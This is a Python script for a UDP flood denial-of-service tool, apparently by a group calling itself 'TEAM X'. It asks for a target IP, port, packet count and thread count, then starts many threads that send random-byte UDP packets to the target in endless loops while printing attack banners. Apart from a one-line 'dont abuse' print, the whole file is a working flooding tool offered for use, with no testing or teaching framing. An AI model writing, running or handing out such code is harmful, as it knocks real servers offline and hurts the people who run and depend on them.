import random
import socket
import threading
import os,sys

os.system("clear")
print('''
    Remake By : BAL7A X



      ████████╗███████╗░█████╗░███╗░░░███╗  {g}██╗░░██╗
      ╚══██╔══╝██╔════╝██╔══██╗████╗░████║  {g}╚██╗██╔╝
      ░░░██║░░░█████╗░░███████║██╔████╔██║  {g}░╚███╔╝░
      ░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║  {g}░██╔██╗░ 
      ░░░██║░░░███████╗██║░░██║██║░╚═╝░██║  {g}██╔╝╚██╗ 
      ░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝  {g} ╚═╝░░╚═╝╝   
                                

''')
print("dont abuse")
print("Tools By BAL7A X")
ip = str(input(" Target IP:"))
port = int(input(" Target Port:"))
choice = str(input("Serang gak (y/n):"))
times = int(input(" Packets :"))
threads = int(input(" Threads:"))

os.system("clear")
def run():
	data = random._urandom(900)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" TEAM X IN ATTACK !!!")
		except:
			print("[X] TEAM X IN ATTACK !!!")

def run2():
	data = random._urandom(900)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" TEAM X IN ATTACK!!!")
		except:
			s.close()
			print("[X] TEAM X IN ATTACK!!!")

def run3():
	data = random._urandom(16)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" SERVER 9A3D YTNEK !!!")
		except:
			s.close()
			print("[X] TEAM X SLE3 KI ZEBI!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	else:
		th = threading.Thread(target = run3)
		th.start()